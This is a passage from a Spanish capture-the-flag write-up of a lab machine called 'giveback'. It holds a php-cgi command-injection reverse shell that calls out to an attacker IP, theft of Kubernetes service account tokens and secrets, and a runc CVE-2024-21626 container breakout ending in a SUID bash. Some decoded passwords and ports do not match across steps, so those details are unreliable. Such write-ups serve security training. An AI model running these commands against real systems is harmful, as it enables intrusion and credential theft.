  thrown in <b>/var/www/html/cgi-bin/php-cgi</b> on line <b>25</b><br />
```

> Se nos indica el uso de la función `passthru()`, la cual debe contener una variable `$command`, la cual no hemos enviado aún.
{: .notice--danger}

Probablemente debamos enviar este valor por `POST`. Con la siguiente función en `bash` podremos realizar solicitudes con el verbo `HTTP` `POST`

``` bash
function __curl_post() {
  # Sintax: __curl_post "http://host[:port]/path" "post_data"
  local url="$1"
  local post_data="$2"
  local proto server path DOC HOST PORT content_length

  read -r proto server path <<<"$(printf '%s' "${url//// }")"
  
  if [ "$proto" != "http:" ]; then
    return 1
  fi
  
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80 # port 80 by default
  
  content_length=${#post_data}
  exec 3<>"/dev/tcp/${HOST}/$PORT"

  printf 'POST %s HTTP/1.0\r\n' "${DOC}" >&3
  printf 'Host: %s\r\n' "${HOST}" >&3
  printf 'Content-Type: application/x-www-form-urlencoded\r\n' >&3
  printf 'Content-Length: %d\r\n' "${content_length}" >&3
  printf '\r\n' >&3
  
  printf '%s' "${post_data}" >&3
  (while read -r line; do
    [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```

### RCE

Validaremos ejecución de comandos enviando directamente uno por `POST`, como `whoami`

``` bash
I have no name!@beta-vino-wp-wordpress-768b9f946c-pfn65:/opt/bitnami/wordpress/wp-admin$ __curl_post "http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input" 'whoami'; echo
[START]root
[END]
```

Lo que quizás nos interese en este momento es ganar acceso a este nuevo contenedor. Iniciaremos un listener desde nuestra máquina por un puerto determinado para recibir conexiones

``` bash
nc -lvnp 4444
```

Enviaremos una reverse shell a nuestra IP por un puerto empleando `netcat` (podemos intentar con varios payloads obtenidos desde [`revshells.com`](https://www.revshells.com/))

``` bash
I have no name!@beta-vino-wp-wordpress-64fdd946fc-7hm5l:/opt/bitnami/wordpress/wp-admin$ __curl_post "http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input" 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 4444 >/tmp/f'; echo
```

> Esta inyección se parece bastante a [CVE-2024-4577](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure), [CVE-2012-1823](https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv) o [CVE-2012-2311](https://nvd.nist.gov/vuln/detail/cve-2012-2311) al explotar el ejecutable `php-gci`, aunque en este caso no se contempla el uso de código `PHP` sino comandos directamente.
{: .notice--warning}


## Shell as `root` in `legacy-intranet-cms` Container

Desde nuestro listener recibiremos una conexión como el usuario `root` en la nueva máquina

``` bash                         
Connection from 10.129.134.159:63051
/bin/sh: can't access tty; job control turned off
/var/www/html/cgi-bin #
```

### TTY Treatment

Haremos un tratamiento de la TTY para operar con una consola más cómoda que nos permita algunos atajos de teclado

``` bash
/var/www/html/cgi-bin # script /dev/null -c sh
Script started, output log file is '/dev/null'.
/var/www/html/cgi-bin # ^[[6;25R^Z
[1]  + 13050 suspended  nc -lvnp 443
andrees@HackBookPro giveback $ stty raw -echo;fg
[1]  + 13050 continued  nc -lvnp 443
                                    reset xterm
                                    
/var/www/html/cgi-bin # stty rows 42 columns 152 # Ajustamos las proporciones de la terminal
```

Ahora nos encontramos dentro del contenedor que corresponde al servicio de la intranet como el usuario `root`

``` bash
/var/www/html/cgi-bin # hostname -i
10.42.1.191

/var/www/html/cgi-bin # hostname
legacy-intranet-cms-6f7bf5db84-zcx88

/var/www/html/cgi-bin # whoami
root
```

> Como la shell es un poco inestable, podemos ya sea ejecutar el comando que queramos directamente como lo hicimos con la reverse shell o bien lanzando un bucle `while true` y `sleep` para automatizar un poco el envío de la reverse shell cada x segundos en caso de perder conexión.
{: .notice--danger}

## Kubernetes API Server Enumeration

> El núcleo del plano de control de `Kubernetes` es el `API Server`. 
> 
> Este servidor expone una [API](https://kubernetes.io/docs/concepts/overview/kubernetes-api/) `HTTP` que permite a los usuarios finales, las diferentes partes del clúster y los componentes externos comunicarse entre sí.
{: .notice--info}

Podemos encontrar una guía en [`HackTricks`](https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/kubernetes-enumeration.html#enumeration-cheatsheet) la cual nos puede ayudar con la enumeración de la API de `Kubernetes`.

### API Server

Comenzaremos recolectando la información que necesitamos para comenzar a enumerar, empezando por el servidor.

Recordemos que pudimos ver donde corre la API gracias a las variables de entorno tanto desde el contenedor de `wordpress` como también lo podemos ver en este

``` bash
/var/www/html/cgi-bin # env | grep KUBERNETES
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_HOST=10.43.0.1
```

### Service Account

> `Service Account` es un objeto administrado por `Kubernetes` y se utiliza para proporcionar una identidad a los procesos que se ejecutan en un `pod`.
{: .notice--info}

Cada cuenta de servicio tiene un secreto asociado, que contiene un `token`. Este es un `JWT` (`JSON Web Token`), un método para representar `claims` de forma segura.

Usualmente uno de los siguientes directorios:

- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccount`

Contiene los siguientes archivos:

- `ca.crt`: Es el certificado `CA` para verificar las comunicaciones de `Kubernetes`.
- `namespace`: Indica el espacio de nombres actual.
- `token`: Contiene el `token` de servicio del `pod` actual.

Al listar uno de los tres directorios dentro de este contenedor, veremos los archivos necesarios para el acceso a la API

``` bash
/var/www/html/cgi-bin # ls /var/run/secrets/kubernetes.io/serviceaccount/
ca.crt     namespace  token
```

Prepararemos unas variables de entorno para hacer más amena la enumeración, ya que estaremos utilizando 

``` bash
/var/www/html/cgi-bin # export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
/var/www/html/cgi-bin # export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
/var/www/html/cgi-bin # export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
/var/www/html/cgi-bin # export TOKEN=$(cat ${SERVICEACCOUNT}/token)
/var/www/html/cgi-bin # export CACERT=${SERVICEACCOUNT}/ca.crt
/var/www/html/cgi-bin # alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""  
```

Podemos buscar el binario `curl`, el cual nos facilitaría mucho el proceso en este momento

``` bash
/var/www/html/cgi-bin # which curl
/usr/bin/curl
```

### Namespace

Podemos ver el `namespace` sobre el que trabaja el clúster en la siguiente ruta

``` bash
/var/www/html/cgi-bin # cat /var/run/secrets/kubernetes.io/serviceaccount/namespace; echo
default
```

### Secrets

Enumeraremos los secretos de `Kubernetes`, pasando un filtro con `jq` para evitar el tremendo output que muestra esta consulta a la API

``` bash
/var/www/html/cgi-bin # kurl -sk "https://$APISERVER/api/v1/namespaces/default/secrets" | jq -r '.items[].metadata.name'
beta-vino-wp-mariadb
beta-vino-wp-wordpress
sh.helm.release.v1.beta-vino-wp.v58
sh.helm.release.v1.beta-vino-wp.v59
sh.helm.release.v1.beta-vino-wp.v60
sh.helm.release.v1.beta-vino-wp.v61
sh.helm.release.v1.beta-vino-wp.v62
sh.helm.release.v1.beta-vino-wp.v63
sh.helm.release.v1.beta-vino-wp.v64
sh.helm.release.v1.beta-vino-wp.v65
sh.helm.release.v1.beta-vino-wp.v66
sh.helm.release.v1.beta-vino-wp.v67
user-secret-babywyrm
```

Vemos al final que existe un secreto llamado `user-secret-babywyrm`

``` bash
/var/www/html/cgi-bin # kurl -sk "https://$APISERVER/api/v1/namespaces/default/secrets/user-secret-babywyrm"
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "user-secret-babywyrm",
    "namespace": "default",
    "uid": "7c68d034-093f-4d96-8ea9-a1f97f37e785",
    "resourceVersion": "2857754",
    "creationTimestamp": "2026-02-21T11:50:27Z",
    "ownerReferences": [
      {
        "apiVersion": "bitnami.com/v1alpha1",
        "kind": "SealedSecret",
        "name": "user-secret-babywyrm",
        "uid": "1e70bb0d-9531-443d-8677-f1b3c88fa25d",
        "controller": true
      }
    ],
    "managedFields": [
      {
        "manager": "controller",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2026-02-21T11:50:27Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:data": {
            ".": {},
            "f:MASTERPASS": {}
          },
          "f:metadata": {
            "f:ownerReferences": {
              ".": {},
              "k:{\"uid\":\"1e70bb0d-9531-443d-8677-f1b3c88fa25d\"}": {}
            }
          },
          "f:type": {}
        }
      }
    ]
  },
  "data": {
    "MASTERPASS": "cm5ZeGl0d2hpZnFSbXdWOEc0YmdBdTdZelpiVVJr"
  },
  "type": "Opaque"
```

El data contiene una clave llamada `MASTERPASS`, que a su vez contiene una cadena en `base64`.

Decodificaremos esta "clave", que seguramente sea la contraseña del usuario, la cual está codificada en `base64`

``` bash
echo "UWFhSXFrdVYzbk1QanlOdlBnQ3Y4Wkp6Tjc1T2I=" | base64 -d;echo
QaaIqkuV3nMPjyNvPgCv8ZJzN75Ob
```


## Shell as `babywyrm`

Con la clave maestra decodificada, podremos conectarnos vía `SSH` con el usuario `babywyrm`

``` bash
sshpass -p 'rnYxitwhifqRmwV8G4bgAu7YzZbURk' ssh -oStrictHostKeyChecking=no babywyrm@giveback.htb
Warning: Permanently added 'giveback.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
Last login: Sat Feb 21 16:52:00 2026 from 10.10.16.8
babywyrm@giveback:~$ id
uid=1000(babywyrm) gid=1000(babywyrm) groups=1000(babywyrm)
```

Ya podremos ver la flag del usuario sin privilegios

``` bash
babywyrm@giveback:~$ cat user.txt 
13c...
```
<br>


# Escalada de Privilegios
---
## Sudoers Privileges - Restricted `runc`

Si listamos los privilegios configurados con `sudo` para el usuario `babywyrm`, notaremos que podemos ejecutar una herramienta llamada `debug`

~~~ bash
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0,
    timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
~~~

Sin embargo, no podremos hacer mucho más que sólo ejecutarla, debido a los estrictos permisos que posee, donde solo `root` tiene el control

``` bash
babywyrm@giveback:~$ ls -l /opt/debug
-rwx------ 1 root root 5802 Nov 12 10:21 /opt/debug
```

Al ejecutar el binario `debug`, veremos que nos pide una contraseña "administrativa"

``` bash
babywyrm@giveback:~$ sudo /opt/debug
[sudo] password for babywyrm: 
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

Error: Incorrect administrative password
```

Volveremos a enumerar los secretos de `kubernetes`, en este caso la contraseña necesaria se encuentra en el secreto de `mariadb-password`

``` bash
/var/www/html/cgi-bin # kurl -sk "https://$APISERVER/api/v1/namespaces/default/secrets/beta-vino-wp-mariadb"
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "beta-vino-wp-mariadb",
    "namespace": "default",
    "uid": "3473d5ec-b774-40c9-a249-81d51426a45e",
    "resourceVersion": "2088227",
    "creationTimestamp": "2024-09-21T22:17:31Z",
    "labels": {
      "app.kubernetes.io/instance": "beta-vino-wp",
      "app.kubernetes.io/managed-by": "Helm",
      "app.kubernetes.io/name": "mariadb",
      "app.kubernetes.io/part-of": "mariadb",
      "app.kubernetes.io/version": "11.8.2",
      "helm.sh/chart": "mariadb-21.0.0"
    },
    "annotations": {
      "meta.helm.sh/release-name": "beta-vino-wp",
      "meta.helm.sh/release-namespace": "default"
    },
    "managedFields": [
      {
        "manager": "helm",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2025-08-29T03:29:54Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:data": {
            ".": {},
            "f:mariadb-password": {},
            "f:mariadb-root-password": {}
          },
          "f:metadata": {
            "f:annotations": {
              ".": {},
              "f:meta.helm.sh/release-name": {},
              "f:meta.helm.sh/release-namespace": {}
            },
            "f:labels": {
              ".": {},
              "f:app.kubernetes.io/instance": {},
              "f:app.kubernetes.io/managed-by": {},
              "f:app.kubernetes.io/name": {},
              "f:app.kubernetes.io/part-of": {},
              "f:app.kubernetes.io/version": {},
              "f:helm.sh/chart": {}
            }
          },
          "f:type": {}
        }
      }
    ]
  },
  "data": {
    "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
    "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
  },
  "type": "Opaque"
```

Al decodificar la cadena, obtendremos la contraseña de `mariadb`

``` bash
echo c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T | base64 -d; echo

sW5sp4spa3u7RLyetrekE4oS
```

Sin ningún tipo de sentido, si ponemos esta contraseña cuando nos pide la "administrativa", veremos que es la correcta

``` bash
babywyrm@giveback:~$ sudo /opt/debug
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
Error: No command specified. Use '/opt/debug --help' for usage information.
```

Podemos consultar el panel de ayuda con la flag `--help`

``` bash
babywyrm@giveback:~$ sudo /opt/debug --help
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: --help
Restricted runc Debug Wrapper

Usage:
  /opt/debug [flags] spec
  /opt/debug [flags] run <id>
  /opt/debug version | --version | -v

Flags:
  --log <file>
  --root <path>
  --debug
```

Podemos ver que esta herramienta llamada debug realmente se trata de un `wrapper` del binario  `runc`.

> `runc` es un entorno de ejecución de contenedores (`Container Runtime`) de bajo nivel, ligero y portátil, que sirve como la implementación de referencia de las especificaciones de la `Open Container Initiative` (`OCI`).
{: .notice--info}

Para ver la versión podemos ejecutar `runc` pasando la flag `--version`

``` bash
babywyrm@giveback:~$ sudo /opt/debug version
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: version
runc version 1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4
```


## CVE-2024-21626 - `runc` Container Breakout

[CVE-2024-21626](https://nvd.nist.gov/vuln/detail/cve-2024-21626) es una vulnerabilidad identificada en `runc 1.11.1` y versiones anteriores. 

Permite a un atacante ganar acceso al sistema de archivos del host subyacente, lo que se traduce en acceso privilegiado al host

### Understanding Vulnerability

> Un contenedor es simplemente un proceso que se ejecuta en el `kernel` del host. Aprovechando diversas características de él para aislarlo del host o de otros contenedores. Una de las formas de hacerlo es mediante un sistema de archivos independiente ([`WithSecure`](https://labs.withsecure.com/publications/runc-working-directory-breakout--cve-2024-21626)).
{: .notice--info}

El problema radica en la fuga de un descriptor de archivo que un contenedor recién creado puede usar para tener un directorio de trabajo dentro del espacio de nombres del sistema de archivos del host.

`runc` crea un identificador para el grupo de control `/sys/fs/cgroup` del host, al que el `runc` podría acceder desde `/proc/self/fd/`.

Podemos encontrar una prueba de concepto desde el siguiente post de [`vsociety_`](https://www.vicarius.io/vsociety/posts/leaky-vessels-part-1-cve-2024-21626)

### Setup

Para trabajar de manera limpia podemos utilizar una imagen de `alpine`, porque es un contenedor mínimo

> `Alpine` es una imagen base de contenedores extremadamente ligera (aprox. `5 MB`) basada en `Alpine Linux`, diseñada para crear contenedores rápidos, eficientes y seguros.
{: .notice--info}

``` bash
docker export $(docker create alpine:latest) > alpine.tar
sshpass -p 'fB9quW9sKdYrsADTHdY5pz0MeEM60Mzr' scp alpine.tar babywyrm@giveback.htb:/tmp
```

Con la opción `spec` crearemos un nuevo archivo de configuración `config.json`

``` bash
babywyrm@giveback:/tmp$ sudo /opt/debug spec
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: spec
```

Este archivo de configuración se creará en el directorio actual

``` bash
babywyrm@giveback:/tmp$ ls config.json
config.json

babywyrm@giveback:/tmp$ cat config.json
{
  "ociVersion": "1.0.2-dev",
  "process": {
    "terminal": true,
    "user": {
      "uid": 0,
      "gid": 0
    },
    "args": [
      "/bin/sh"
    ],
    "env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "TERM=xterm"
    ],
    "cwd": "/",
    "capabilities": {
      "bounding": [
        "CAP_CHOWN",
        "CAP_DAC_OVERRIDE",
        "CAP_FSETID",
        "CAP_FOWNER",
        "CAP_MKNOD",
        "CAP_NET_RAW"
      ],
      "effective": [
        "CAP_CHOWN",
        "CAP_DAC_OVERRIDE",
        "CAP_FSETID",
        "CAP_FOWNER",
        "CAP_MKNOD",
        "CAP_NET_RAW"
      ],
      "inheritable": [],
      "permitted": [
        "CAP_CHOWN",
        "CAP_DAC_OVERRIDE",
        "CAP_FSETID",
        "CAP_FOWNER",
        "CAP_MKNOD",
        "CAP_NET_RAW"
      ],
      "ambient": []
    },
    "rlimits": [
      {
        "type": "RLIMIT_NOFILE",
        "hard": 1024,
        "soft": 1024
      }
    ],
    "noNewPrivileges": true
  },
  "root": {
    "path": "rootfs",
    "readonly": true
  },
  "hostname": "runc",
  "mounts": [
    {
      "destination": "/proc",
      "type": "proc",
      "source": "proc"
    },
    {
      "destination": "/dev",
      "type": "tmpfs",
      "source": "tmpfs",
      "options": [
        "nosuid",
        "strictatime",
        "mode=755",
        "size=65536k"
      ]
    },
    {
      "destination": "/dev/pts",
      "type": "devpts",
      "source": "devpts",
      "options": [
        "nosuid",
        "noexec",
        "newinstance",
        "ptmxmode=0666",
        "mode=0620",
        "gid=5"
      ]
    },
    {
      "destination": "/dev/shm",
      "type": "tmpfs",
      "source": "shm",
      "options": [
        "nosuid",
        "noexec",
        "nodev",
        "mode=1777",
        "size=65536k"
      ]
    },
    {
      "destination": "/dev/mqueue",
      "type": "mqueue",
      "source": "mqueue",
      "options": [
        "nosuid",
        "noexec",
        "nodev"
      ]
    },
    {
      "destination": "/sys",
      "type": "sysfs",
      "source": "sysfs",
      "options": [
        "nosuid",
        "noexec",
        "nodev",
        "ro"
      ]
    },
    {
      "destination": "/sys/fs/cgroup",
      "type": "cgroup",
      "source": "cgroup",
      "options": [
        "nosuid",
        "noexec",
        "nodev",
        "relatime",
        "ro"
      ]
    }
  ],
  "linux": {
    "resources": {},
    "namespaces": [
      {
        "type": "pid"
      },
      {
        "type": "ipc"
      },
      {
        "type": "uts"
      },
      {
        "type": "mount"
      },
      {
        "type": "network"
      }
    ],
    "maskedPaths": [
      "/proc/acpi",
      "/proc/asound",
      "/proc/kcore",
      "/proc/keys",
      "/proc/latency_stats",
      "/proc/timer_list",
      "/proc/timer_stats",
      "/proc/sched_debug",
      "/sys/firmware",
      "/proc/scsi"
    ],
    "readonlyPaths": [],
    "maskPaths": [],
    "seccomp": null
  }
}
```

Ahora continuaremos con los archivos necesarios para lanzar el contenedor adecuadamente. 

Crearemos un directorio para alojar estos archivos, luego allí dentro crearemos un directorio `rootfs` y descomprimiremos el `.tar` allí

``` bash
babywyrm@giveback:/tmp$ mkdir evilcontainer
babywyrm@giveback:/tmp$ mkdir -p evilcontainer/rootfs
babywyrm@giveback:/tmp/evilcontainer$ tar -xf alpine.tar -C evilcontainer/rootfs
```

Crearemos una copia del archivo `config.json` dentro de un directorio donde iniciaremos nuestro contenedor, esto porque no podemos editarlo directamente pero sí leerlo

``` bash
babywyrm@giveback:/tmp$ cp config.json evilcontainer/
```

### Exploiting

Solamente necesitaremos cambiar el valor de `cwd` (`Current Working Directory`), el cual por defecto es la raíz (`/`) al valor de `/proc/self/fd/7`

``` bash
babywyrm@giveback:/tmp$ cd evilcontainer/
babywyrm@giveback:/tmp/evilcontainer$ sed -i 's/"cwd": "\/",/"cwd":"\/proc\/self\/fd\/7",/' config.json

babywyrm@giveback:/tmp/evilcontainer$ cat config.json | grep cwd
    "cwd":"/proc/self/fd/7",
```

### Root Time

Ahora iniciaremos el contenedor usando la flag `--log`, la cual es necesaria

``` bash
babywyrm@giveback:/tmp/evilcontainer$ sudo /opt/debug --log /tmp/log.json run evilcontainer
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: run
[*] Starting container: evilcontainer
# 
```

El contenedor se ha creado e iniciado correctamente. 

Al listar la raíz veremos los archivos del contenedor, pero si retrocedemos tres directorios, veremos el sistema de archivos del host

``` bash
 # ls /
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var

 # ls ../../../root
\                  audit__.sh         coredns            dns.sh             helm               iptables_rules.sh  python             root.txt
```

Ahora podemos simplemente asignar permisos `SUID` al binario `bash` del host

``` bash
# chmod 4755 ../../../bin/bash
```

Comprobaremos los nuevos permisos y lanzaremos una `bash` con la opción `-p` para lanzarla como el propietario, que es `root`

``` bash
babywyrm@giveback:/tmp/evilcontainer$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
babywyrm@giveback:/tmp/evilcontainer$ bash -p
bash-5.1# id
uid=1000(babywyrm) gid=1000(babywyrm) euid=0(root) groups=1000(babywyrm)
```

Ya podremos ver la flag ubicada en el directorio `root`

``` bash
bash-5.1# cat /root/root.txt 
e1d...
```


## (Unintended) - Mount Restriction Bypass

Cuando intentamos escalar privilegios sin tener en cuenta el CVE, simplemente siguiendo una guía de [`HackTricks`](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/runc-privilege-escalation.html#pe) (se podía cuando salió la máquina, y fue parchado, aunque aún es posible).

Prepararemos un directorio para alojar los archivos del contenedor, tal como lo hicimos [anteriormente](#Setup).

> En este caso estoy asumiendo que tienes la imagen de `alpine` en el directorio actual, tal como lo hicimos en la explotación del CVE.
{: .notice--warning}

``` bash
babywyrm@giveback:/tmp$ mkdir evilcontainer
babywyrm@giveback:/tmp$ mkdir -p evilcontainer/rootfs
babywyrm@giveback:/tmp$ tar -xf alpine.tar -C evilcontainer/rootfs
babywyrm@giveback:/tmp$ sudo /opt/debug spec
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: spec
```

Ahora al igual que en la explotación anterior, haremos una copia de este archivo `config.json` para poder editarlo

``` bash
babywyrm@giveback:/tmp$ cp config.json evilcontainer
```

> Debemos añadir las líneas tal como se menciona en el post de [`HackTricks`](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/runc-privilege-escalation.html#pe), dentro del array `mounts`.
{: .notice--danger}

``` json
...
<SNIP>
...
  "mounts": [
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},
    {
      "destination": "/proc",
      "type": "proc",
      "source": "proc"
    },
    {
...
<SNIP>
...
```

Cuando intentamos lanzar el contenedor, obtenemos un conflicto y la herramienta nos dice que no está permitido montar el directorio `/root` (y también desde `/` supongo)

``` bash
babywyrm@giveback:/tmp$ cd evilcontainer
babywyrm@giveback:/tmp/evilcontainer$ sudo /opt/debug run evilcontainer
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: run
Error: Host root filesystem mount detected - not permitted
```

### Exploiting

Podemos intentar hacer `bypass` a esta restricción usando un directorio diferente, como `/etc`, `/home`, `/var`, etc.

Modificaremos el archivo `config.json` para comenzar desde cualquier directorio y retroceder, de la siguiente manera

``` json
...
<SNIP>
...
  "mounts": [
{
    "type": "bind",
    "source": "/home/../",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},
    {
      "destination": "/proc",
      "type": "proc",
      "source": "proc"
    },
    {
...
<SNIP>
...
```

Ahora lanzaremos el contenedor de la siguiente manera

``` bash
babywyrm@giveback:/tmp/evilcontainer$ sudo /opt/debug run evilcontainer
/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: run
[*] Starting container: evilcontainer
# 
```

Ahora podremos acceder al directorio `/root` del host

``` bash
# ls root
'\'   audit__.sh   coredns   dns.sh   helm   iptables_rules.sh	python   root.txt

# cat /root/root.txt
e1d...
```

Gracias por leer, a continuación te dejo la cita del día.

> In order to live free and happily you must sacrifice boredom. It is not always an easy sacrifice.
> — Richard Bach
{: .notice--info}
